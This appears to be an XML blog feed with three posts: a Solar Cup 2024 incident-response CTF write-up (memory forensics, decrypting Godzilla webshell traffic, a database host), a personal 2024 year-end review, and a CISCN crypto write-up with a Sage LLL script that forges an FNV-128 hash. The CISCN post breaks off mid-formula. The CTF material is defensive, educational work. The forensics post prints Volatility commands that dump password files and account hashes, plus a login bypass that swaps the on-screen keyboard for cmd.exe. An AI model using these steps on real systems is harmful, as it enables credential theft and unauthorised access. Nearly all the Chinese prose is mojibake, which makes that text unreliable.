    <content type="html"><![CDATA[<h1 id="2024ç¬¬ä¸€å±Šsolaræ¯åº”æ€¥å“åº”æŒ‘æˆ˜èµ›"><a class="markdownIt-Anchor" href="#2024ç¬¬ä¸€å±Šsolaræ¯åº”æ€¥å“åº”æŒ‘æˆ˜èµ›"></a> 2024ç¬¬ä¸€å±ŠSolaræ¯åº”æ€¥å“åº”æŒ‘æˆ˜èµ›</h1><h2 id="å†…å­˜å–è¯"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯"></a> å†…å­˜å–è¯</h2><h3 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°"></a> ç­¾åˆ°</h3><p>ã€Šä¸€æŠŠæ¢­ã€‹</p><p><img src="/imgs/solar2024/1.png" alt="1" /></p><h3 id="å†…å­˜å–è¯-2"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯-2"></a> å†…å­˜å–è¯</h3><p>æŸ¥çœ‹é•œåƒä¿¡æ¯ï¼Œæš‚å®šé•œåƒç³»ç»Ÿä¸ºWin7SP1x64</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw imageinfo</code></p><p><img src="/imgs/solar2024/2.png" alt="2" /></p><p>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64</p><h4 id="å†…å­˜å–è¯-1"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯-1"></a> å†…å­˜å–è¯-1</h4><p>æ‰¾åˆ°rdpè¿æ¥çš„è·³æ¿åœ°å€ï¼Œé€šè¿‡æŸ¥æ‰¾ç½‘ç»œè¿æ¥æƒ…å†µï¼Œå¹¶ä¸”è¿‡æ»¤RDPçš„3389ç«¯å£ï¼Œå‘ç°è¿æ¥çš„IP</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan | grep 3389</code></p><p><img src="/imgs/solar2024/3.png" alt="3" /></p><h4 id="å†…å­˜å–è¯-2"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯-2"></a> å†…å­˜å–è¯-2</h4><p>æ²¡é™åˆ¶æäº¤æ¬¡æ•°å°±ä¸€ä¸ªä¸ªè¯•</p><p><img src="/imgs/solar2024/6.png" alt="6" /></p><p>åé¢æ‰«å‘½ä»¤è¡Œçš„æ—¶å€™çœ‹åˆ°äº†</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan</code></p><p><img src="/imgs/solar2024/7.png" alt="7" /></p><h4 id="å†…å­˜å–è¯-3"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯-3"></a> å†…å­˜å–è¯-3</h4><p>æ”»å‡»è€…è·å–çš„â€œFusionManagerèŠ‚ç‚¹æ“ä½œç³»ç»Ÿå¸æˆ·ï¼ˆä¸šåŠ¡å¸æˆ·ï¼‰â€çš„å¯†ç æ˜¯ä»€ä¹ˆ</p><p>é€šè¿‡æ‰«ææ–‡ä»¶ï¼Œå¹¶è¿‡æ»¤æ¡Œé¢ï¼Œå‘ç°ä¸€ä¸ªpass.txtï¼Œä¸‹è½½ä¸‹æ¥å‘ç°å°±æ˜¯æ”¾å¯†ç çš„æ–‡ä»¶</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | grep Desktop</code></p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D ./</code></p><p><img src="/imgs/solar2024/4.png" alt="4" /></p><p><img src="/imgs/solar2024/5.png" alt="5" /></p><h4 id="å†…å­˜å–è¯-4"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯-4"></a> å†…å­˜å–è¯-4</h4><p>ç›´æ¥æŸ¥æ‰¾æ‰€æœ‰ç”¨æˆ·åï¼Œä¸€ä¸ªä¸ªè¯•ä¸€ä¸‹</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></p><p><img src="/imgs/solar2024/8.png" alt="8" /></p><h4 id="å†…å­˜å–è¯-6"><a class="markdownIt-Anchor" href="#å†…å­˜å–è¯-6"></a> å†…å­˜å–è¯-6</h4><p>hashdumpç›´æ¥æ‰¾</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump</code></p><p><img src="/imgs/solar2024/9.png" alt="9" /></p><h2 id="æ—¥å¿—æµé‡"><a class="markdownIt-Anchor" href="#æ—¥å¿—æµé‡"></a> æ—¥å¿—æµé‡</h2><h3 id="æ—¥å¿—æµé‡-1"><a class="markdownIt-Anchor" href="#æ—¥å¿—æµé‡-1"></a> æ—¥å¿—æµé‡-1</h3><p>æ ¹æ®æç¤ºï¼Œéšä¾¿ç¿»ç¿»ï¼Œçœ‹åˆ°ä¸€ä¸²base64ä¸²å¾ˆå¥‡æ€ªï¼Œè§£å¯†ä¹‹åå°±æ˜¯flag</p><p><img src="/imgs/solar2024/10.png" alt="10" /></p><p><img src="/imgs/solar2024/11.png" alt="11" /></p><h3 id="æ—¥å¿—æµé‡-2"><a class="markdownIt-Anchor" href="#æ—¥å¿—æµé‡-2"></a> æ—¥å¿—æµé‡-2</h3><p>å°†b.jspè¿›è¡Œbase64åŠ å¯†ï¼Œç„¶ååœ¨æ—¥å¿—æµé‡-1å›¾ä¸­flagä¸‹é¢é‚£ä¸€ä¸²åå…­è¿›åˆ¶å°±æ˜¯å“¥æ–¯æ‹‰è§£å¯†çš„å¯†ç ï¼Œç„¶åä½¿ç”¨pz-proè§£å¯†</p><p>è§£å¯†æˆåŠŸï¼Œè¯´æ˜å¯†é’¥æ­£ç¡®</p><p><img src="/imgs/solar2024/12.png" alt="12" /></p><p>å¯¼å‡ºwire.pcapngçš„HTTPæ–‡ä»¶ï¼Œé€ä¸€è§£å¯†</p><p><img src="/imgs/solar2024/16.png" alt="16" /></p><h3 id="æ—¥å¿—æµé‡-3"><a class="markdownIt-Anchor" href="#æ—¥å¿—æµé‡-3"></a> æ—¥å¿—æµé‡-3</h3><p>è§£å¯†è¿™ä¸ª15KBçš„æ–‡ä»¶</p><p><img src="/imgs/solar2024/13.png" alt="13" /></p><p>æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå¯¼å‡ºä¸€ä¸‹å»æ‰å‰é¢å¤šä½™éƒ¨åˆ†ï¼Œæ‰“å¼€å°±æ˜¯flag</p><p><img src="/imgs/solar2024/14.png" alt="14" /></p><p><img src="/imgs/solar2024/15.png" alt="15" /></p><h2 id="æ•°æ®åº“"><a class="markdownIt-Anchor" href="#æ•°æ®åº“"></a> æ•°æ®åº“</h2><p>å‰åŠéƒ¨åˆ†å‚è€ƒè¿™ç¯‡ï¼Œä¿®æ”¹å±å¹•é”®ç›˜ä¸ºcmd.exe</p><p><a href="https://www.cnblogs.com/gates/p/7510751.html">VMwareè™šæ‹Ÿæœºå¿˜è®°å¼€æœºå¯†ç æ€ä¹ˆåŠ - gate_s - åšå®¢å›­</a></p><p>æˆåŠŸ</p><p><img src="/imgs/solar2024/17.png" alt="17" /></p><p>ä¿®æ”¹å¯†ç æˆåŠŸ</p><p><img src="/imgs/solar2024/18.png" alt="18" /></p><h3 id="æ•°æ®åº“-1"><a class="markdownIt-Anchor" href="#æ•°æ®åº“-1"></a> æ•°æ®åº“-1</h3><p>äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹å®‰å…¨æ—¥å¿—ï¼Œè¿‡æ»¤4720ç”¨æˆ·äº‹ä»¶ï¼Œå°±æ˜¯ç¬¬ä¸€ä¸ªæ—¥å¿—äº†</p><p><img src="/imgs/solar2024/19.png" alt="19" /></p><h3 id="æ•°æ®åº“-2"><a class="markdownIt-Anchor" href="#æ•°æ®åº“-2"></a> æ•°æ®åº“-2</h3><p>é€šè¿‡netstatæŸ¥çœ‹åˆ°æœ‰ä¸€ä¸ªç«¯å£å¾ˆå¥‡æ€ª</p><p><img src="/imgs/solar2024/20.png" alt="20" /></p><p>é€šè¿‡netstat -ano æŸ¥çœ‹åˆ°IPåœ°å€ï¼ˆæ•°æ®åº“-3ï¼‰</p><p><img src="/imgs/solar2024/21.png" alt="21" /></p><p>é€šè¿‡tasklistæŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</p><p><img src="/imgs/solar2024/22.png" alt="22" /></p><h3 id="æ•°æ®åº“-3"><a class="markdownIt-Anchor" href="#æ•°æ®åº“-3"></a> æ•°æ®åº“-3</h3><p>è§æ•°æ®åº“-2</p><h3 id="æ•°æ®åº“-5"><a class="markdownIt-Anchor" href="#æ•°æ®åº“-5"></a> *æ•°æ®åº“-5</h3><p>ä¸æ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Ÿ</p><p><code>Get-ChildItem -Path C:\ -Recurse -Filter &quot;jusched.exe&quot; -ErrorAction SilentlyContinue | Select-Object FullName</code></p><p><code> Get-FileHash -Path &quot;C:\Program Files\Java\latest\jre-1.8\xmrig.exe&quot; -Algorithm MD5</code></p><h2 id="ç»¼åˆåº”æ€¥"><a class="markdownIt-Anchor" href="#ç»¼åˆåº”æ€¥"></a> ç»¼åˆåº”æ€¥</h2><p>ä½ å‘Šè¯‰æˆ‘ç†è®ºèƒ½æœåˆ°åŸé¢˜ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™æ¯”äº†ä¸ªå¯‚å¯</p><h3 id="ç†è®º"><a class="markdownIt-Anchor" href="#ç†è®º"></a> ç†è®º</h3><p>éƒ½æ˜¯ç›´æ¥çŒœçš„</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024å¹´åº¦æ€»ç»“</title>
    <link href="/2024/12/16/2024final/"/>
    <url>/2024/12/16/2024final/</url>
    
    <content type="html"><![CDATA[<h1 id="2024å¹´åº¦æ€»ç»“"><a class="markdownIt-Anchor" href="#2024å¹´åº¦æ€»ç»“"></a> 2024å¹´åº¦æ€»ç»“</h1><h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h2><p>2024ä¹Ÿå¾ˆå¿«å°±è¿‡å»äº†ï¼Œä»Šå¹´å¤§éƒ¨åˆ†äº‹ä¹Ÿéƒ½åšå®Œäº†ï¼Œå°±è¶ä»Šå¤©ç”Ÿæ—¥ï¼Œåšä¸€ä¸‹æ€»ç»“å§ã€‚</p><h2 id="ctfæ€»ç»“"><a class="markdownIt-Anchor" href="#ctfæ€»ç»“"></a> CTFæ€»ç»“</h2><p>ä¸ŠåŠå¹´è¯´è¿‡çš„è¿™é‡Œå°±ä¸è¯´äº†ã€‚</p><p>æˆ‘è§‰å¾—æœ€é‡è¦çš„å°±æ˜¯è¿›äº†ä¸€æ¬¡çº¿ä¸‹å§ï¼Œæ²¡æƒ³åˆ°27ï¼ˆè¿›20ï¼‰åéƒ½èƒ½è¿›é—½ç›¾æ¯çº¿ä¸‹ï¼Œå½“æ—¶åœ¨ç°åœºå±…ç„¶çœ‹åˆ°äº†æœ‰70å¤šåçš„éƒ½è¿›äº†çº¿ä¸‹ã€‚åŸæ¥å¤§ä½¬éƒ½å·²ç»çœ‹ä¸ä¸Šè¿™ç§æ¯”èµ›äº†ã€‚</p><p>åœ¨çº¿ä¸‹é é˜Ÿå‹è¹­äº†ä¸ªä¸‰ç­‰å¥–ã€‚ï¼ˆå¯†ç æ‰‹çº¿ä¸‹å°±æ˜¯å»æ—…æ¸¸å“’ï¼‰</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/imgs/2024final/2.png" alt="" /></div><div class="group-image-wrap"><img src="/imgs/2024final/3.jpg" alt="" /></div><div class="group-image-wrap"><img src="/imgs/2024final/4.png" alt="" /></div></div></div><p>ä¹‹ååœ¨NSS-3rdçš„æ—¶å€™å‡­è¿æ°”æ‹¿åˆ°äº†ç¬¬ä¸€ä»½è´´çº¸ã€‚ï¼ˆå¥½çœ‹è€¶ï¼‰</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/imgs/2024final/5.png" alt="" /></div><div class="group-image-wrap"><img src="/imgs/2024final/6.png" alt="" /></div></div></div><p>å™¢å¯¹äº†ï¼Œè¿˜æœ‰å‚ä¸äº†BaseCTFå‡ºé¢˜ï¼Œå°½è‡ªå·±æœ€å¤§çš„åŠªåŠ›å‡ºé¢˜äº†ï¼Œä¹Ÿç®—ç»å†äº†ä¸€æ®µéš¾å¿˜çš„æ¯”èµ›ã€‚ï¼ˆä¹‹åå°±ç›´æ¥èäº†ï¼Œå‡ºé¢˜çœŸéš¾å§</p><p><img src="/imgs/2024final/7.png" alt="" /></p><p>åœ¨ä¹‹åå°±å¼€å§‹å¿™æ¯•è®¾çš„äº‹æƒ…äº†ï¼ŒCTFä¹Ÿæ˜¯æœ‰æ¯”èµ›å°±çœ‹çœ‹é¢˜</p><p>ç„¶åæ‰“äº†ä¸€ä¸ªçœèµ›miniï¼Œåˆèµ›å¯è”ç½‘å¯AIç†è®ºï¼Œå†³èµ›CTFï¼Œä¹Ÿæ˜¯è¿æ°”å¥½æ‹¿äº†ä¸ªç¬¬ä¸‰ï¼ŒäºŒç­‰å¥–</p><p><img src="/imgs/2024final/8.jpg" alt="" /></p><p>ä¹‹åå°±ä¸€ç›´åˆ°äº†ciscn-ccbäº†å§ï¼Œç§‰æŒç€å›½èµ›äº†å°±è®¤çœŸä¸€ç‚¹çš„æ€åº¦ï¼Œæ‹‰ç€é˜Ÿå‹æ¥è®¤çœŸåç‰¢ï¼Œæœ€åé™¤äº†ä¸¤é¢˜å¯†ç åŸé¢˜ï¼Œå…¶ä»–çš„éƒ½æ˜¯å–è¯æ‹¿çš„åˆ†ï¼Œé˜Ÿå‹çš„å–è¯å¤ªå¼ºå•¦ï¼Œç»“æŸä¹‹åèµ›åŒºä¹Ÿæ˜¯è¿›äº†å‰100ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½è¿›åŠå†³èµ›è·Ÿå¸ˆå‚…ä»¬é¢åŸºå‘¢ï¼Œå¯èƒ½ä¹Ÿæ˜¯æ­¤èº«ä»…æœ‰çš„æœºä¼šäº†ã€‚</p><h2 id="å…¶ä»–"><a class="markdownIt-Anchor" href="#å…¶ä»–"></a> å…¶ä»–</h2><p>ç°åœ¨ä¹Ÿæ˜¯22å²äº†ï¼Œè¿™ä¸€å¹´å‘ç”Ÿäº†å¥½å¤šå¥½å¤šäº‹ã€‚</p><p>é¦–å…ˆèº«ä½“å¥åº·æœ‰ç‚¹ä¸‹é™ï¼Œé”»ç‚¼æ¬¡æ•°å˜å°‘äº†ï¼Œç°åœ¨åŠé©¬ä¹Ÿè·‘ä¸äº†äº†ï¼ˆé‰´å®šä¸ºæ‰“CTFæ‰“çš„ï¼‰ã€‚ç°åœ¨æ—¶é—´å……è£•äº†ï¼Œä¹Ÿæ˜¯æ¢å¤é”»ç‚¼äº†ï¼Œè¯´åˆ°åº•è¿˜æ˜¯èº«ä½“æœ€é‡è¦ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…ä»¬ä¸è¦emoäº†å™¢ã€‚å¯¹äº†ï¼Œä»Šå¤©æ™šä¸Šå‡ºå»è·‘æ­¥ï¼Œçœ‹åˆ°äº†éå¸¸æ¼‚äº®çš„å¤œè‰²æµ·æ™¯ï¼Œè·‘æ­¥çš„ç–²æƒ«æ„Ÿä¸€ä¸‹å­å°±æ²¡äº†ï¼Œå¦‚æœå¸ˆå‚…ä»¬ç´¯äº†ï¼Œå¯ä»¥æ”¾ä¸‹æ‰‹å¤´çš„äº‹æƒ…å‡ºå»æ•£æ•£å¿ƒå™¢ã€‚</p><p>ä¸è¿‡ç²¾ç¥å¥åº·ä»Šå¹´æ”¹å–„äº†å¾ˆå¤šã€‚å¹´åˆçš„æ—¶å€™å°è¯•äº†ä¸€æ¬¡é¢è¯•ï¼Œå‘ç°è‡ªå·±çœŸçš„ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å‡†å¤‡å°±å»è¢«æ‹·æ‰“äº†ï¼Œç®€å†ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå°±åƒä¸Šäº†æˆ˜åœºå‘ç°æ²¡æœ‰å…µå™¨ä¸€æ ·ï¼Œä¹‹åç›´æ¥è¿·èŒ«äº†ï¼Œæƒ³ç€é€ƒé¿ï¼Œç»“æœå°±æƒ³ç€ä¹‹å‰æ¥è§¦è¿‡ä¸€ç‚¹çš„CTFï¼Œæ„Ÿè§‰è›®å¥½ç©çš„ï¼Œå°±æ¥æ·±å…¥äº†ï¼Œä¹Ÿç®—æ˜¯åšçš„æœ€å¯¹çš„ä¸€ä¸ªå†³å®šäº†å§ã€‚æˆ‘ä¸ªäººè®¤ä¸ºï¼ŒCTFå¯ä»¥å¾ˆå¥½çš„å¸®åŠ©æ–°æ‰‹å…¥é—¨è®¡ç®—æœºï¼Œå…¥é—¨å®‰å…¨ï¼Œä¸ä»…èƒ½é”»ç‚¼å¿«é€Ÿå­¦ä¹ èƒ½åŠ›ï¼Œä¹Ÿå¯ä»¥æœ‰å¾ˆå¤šæ–¹å‘çš„é€‰æ‹©ï¼Œè¿˜æœ‰é‚£ä¹ˆå¤šå¸ˆå‚…è‚¯å¸®å¿™ï¼Œå½“ç„¶å¦‚ä»ŠCTFå¤§ç¯å¢ƒæˆ‘å°±ä¸è¯´äº†ã€‚ç»™è‡ªå·±æ‰¾äº†äº‹æƒ…åšä¹‹åï¼Œè„‘å­å°±ä»€ä¹ˆéƒ½ä¸ä¼šæƒ³äº†ï¼Œä»€ä¹ˆemoã€ç„¦è™‘å•¥çš„ï¼Œéƒ½é£èµ°å•¦ã€‚</p><p>å¤§å­¦ä¹Ÿä»…å‰©æœ€ååŠå¹´äº†ï¼Œå¸Œæœ›ä¹‹åä¸€åˆ‡é¡ºåˆ©å§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>me</category>
      
    </categories>
    
    
    <tags>
      
      <tag>me</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN-CCB-BY-YR</title>
    <link href="/2024/12/15/ciscnccb/"/>
    <url>/2024/12/15/ciscnccb/</url>
    
    <content type="html"><![CDATA[<h1 id="yræˆ˜é˜Ÿ-writeup"><a class="markdownIt-Anchor" href="#yræˆ˜é˜Ÿ-writeup"></a> YRæˆ˜é˜Ÿ WRITEUP</h1><h2 id="ä¸€-æˆ˜é˜Ÿä¿¡æ¯"><a class="markdownIt-Anchor" href="#ä¸€-æˆ˜é˜Ÿä¿¡æ¯"></a> ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯</h2><p>æˆ˜é˜Ÿåç§°ï¼šYR</p><p>æˆ˜é˜Ÿæ’åï¼š492</p><h2 id="äºŒ-è§£é¢˜æƒ…å†µ"><a class="markdownIt-Anchor" href="#äºŒ-è§£é¢˜æƒ…å†µ"></a> äºŒã€è§£é¢˜æƒ…å†µ</h2><p><img src="/imgs/CISCNCCB2025/1.png" alt="" /></p><h2 id="ä¸‰-è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#ä¸‰-è§£é¢˜è¿‡ç¨‹"></a> ä¸‰ã€è§£é¢˜è¿‡ç¨‹</h2><h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h3><h4 id="fffffhash"><a class="markdownIt-Anchor" href="#fffffhash"></a> fffffhash</h4><p>é€šè¿‡è¾“å‡ºå…³é”®çš„å‚æ•°x=309485009821345068724781371ï¼Œ</p><p>æœç´¢309485009821345068724781371çŸ¥é“æ˜¯FNV-128bit</p><p>æŸ¥åˆ°åˆ©ç”¨LLLçš„ç±»ä¼¼çš„wp:<a href="https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/fnv/solve/solution_joseph_LLL.sage">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/fnv/solve/solution_joseph_LLL.sage</a></p><p>ç›´æ¥ç…§ç€é¢˜ç›®ä»£ç ä¿®æ”¹å‚æ•°</p><p>é€šè¿‡è°ƒè¯•å¾—åˆ°nçš„å¤§å°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">TARGET = <span class="hljs-number">201431453607244229943761366749810895688</span><br>h0 = <span class="hljs-number">0x6c62272e07bb014262b821756295c58d</span><br>p = <span class="hljs-number">0x0000000001000000000000000000013b</span><br>MOD = <span class="hljs-number">2</span>**<span class="hljs-number">128</span><br><br>n = <span class="hljs-number">16</span><br>M = Matrix.column([p^(n - i - <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)] + [-(TARGET - h0*p^n), MOD])<br>M = M.augment(identity_matrix(n+<span class="hljs-number">1</span>).stack(vector([<span class="hljs-number">0</span>] * (n+<span class="hljs-number">1</span>))))<br>Q = Matrix.diagonal([<span class="hljs-number">2</span>^<span class="hljs-number">128</span>] + [<span class="hljs-number">2</span>^<span class="hljs-number">4</span>] * n + [<span class="hljs-number">2</span>^<span class="hljs-number">8</span>])<br>M *= Q<br>M = M.BKZ()<br>M /= Q<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> M:<br>    <span class="hljs-keyword">if</span> r[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(r[-<span class="hljs-number">1</span>]) == <span class="hljs-number">1</span>:<br>        r *= r[-<span class="hljs-number">1</span>]<br>        good = r[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(good)<br>        <span class="hljs-keyword">break</span><br>inp = []<br>y = <span class="hljs-built_in">int</span>(h0*p)<br>t = (h0*p^n + good[<span class="hljs-number">0</span>] * p^(n-<span class="hljs-number">1</span>)) % MOD<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        y_ = (<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p^(n-i-<span class="hljs-number">1</span>) % MOD<br>        <span class="hljs-keyword">if</span> y_ == t:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;good&#x27;</span>, i, x)<br>            inp.append(x)<br>            <span class="hljs-keyword">if</span> i &lt; n-<span class="hljs-number">1</span>:<br>                t = (t + good[i+<span class="hljs-number">1</span>] * p^(n-i-<span class="hljs-number">2</span>)) % MOD<br>                y = ((<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p) % MOD<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, i)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(inp).<span class="hljs-built_in">hex</span>())<br>// 020101081b04390001051a020a3d0f0f<br></code></pre></td></tr></table></figure><p><img src="/imgs/CISCNCCB2025/fffffrand/1.png" alt="" /></p><h4 id="rasnd"><a class="markdownIt-Anchor" href="#rasnd"></a> rasnd</h4><p>æ‰‹åŠ¨è¿æ¥å¾—åˆ°å‚æ•°</p><p>part1:</p><p>å…ˆå¤„ç†hint1å’Œhint2</p><p>çˆ†ç ´è¾ƒå°çš„xï¼Œhint2*x1ï¼Œhint1*x2ï¼Œç›¸å‡å†ä¸n1è¿›è¡ŒGCDå°±å¯ä»¥å¾—åˆ°q</p><p>å¾—åˆ°qç›´æ¥è§£å¯†å°±è¡Œäº†</p><p>part2:</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/luochen2436/article/details/129181271">https://blog.csdn.net/luochen2436/article/details/129181271</a></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><msub><mi>t</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mi>n</mi><mo>âˆ’</mo><mi>p</mi><mo>âˆ’</mo><mi>q</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mo>=</mo><msup><mi>m</mi><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mo>=</mo><msup><mi>m</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mi>h</mi><mi>i</mi><mi>n</mi><msubsup><mi>t</mi><mn>2</mn><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">hint_2=m^{n-p-q}\mod q=m^{\phi(n)-1}\mod q=m^{-1}\mod q\\m=hint_2^{-1}\mod q\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.821331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï•</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" 